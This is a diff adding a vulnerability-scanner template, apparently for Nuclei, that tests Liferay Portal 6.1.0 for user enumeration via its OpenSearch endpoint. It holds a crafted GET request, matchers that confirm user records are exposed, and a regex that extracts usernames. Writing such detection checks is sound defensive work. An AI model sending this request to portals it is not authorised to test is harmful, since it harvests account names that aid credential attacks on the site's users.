@@ -1,0 +1,46 @@
+id: liferay-user-enum
+
+info:
+  name: Liferay Portal User Enumeration
+  author: collapsz
+  severity: medium
+  description: |
+    Liferay Portal 6.1.0 is vulnerable to user enumeration via the OpenSearch endpoint. An
+    attacker can exploit this vulnerability to retrieve a list of users from the portal by sending
+    a specially crafted request to the OpenSearch endpoint. 
+  tags: liferay,enum,exposure,cve-2012-10002
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/c/search/open_search?p=1&c=5000&keywords=entryClassName:com.liferay.portal.model.User"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - '<liferay:entryClassName>com.liferay.portal.model.User'
+          - '<entry>'
+        condition: and
+
+      - type: regex
+        part: body
+        regex:
+          - '<opensearch:totalResults>\d+</opensearch:totalResults>'
+
+      - type: word
+        negative: true
+        words:
+          - '<opensearch:totalResults>0</opensearch:totalResults>'
+          - '<opensearch:totalResults><![CDATA[0]]></opensearch:totalResults>'
+    extractors:
+      - type: regex
+        name: username
+        part: body
+        group: 1
+        regex:
+          - '<title><!\[CDATA\[.*?: (.*?)\]\]><\/title>'
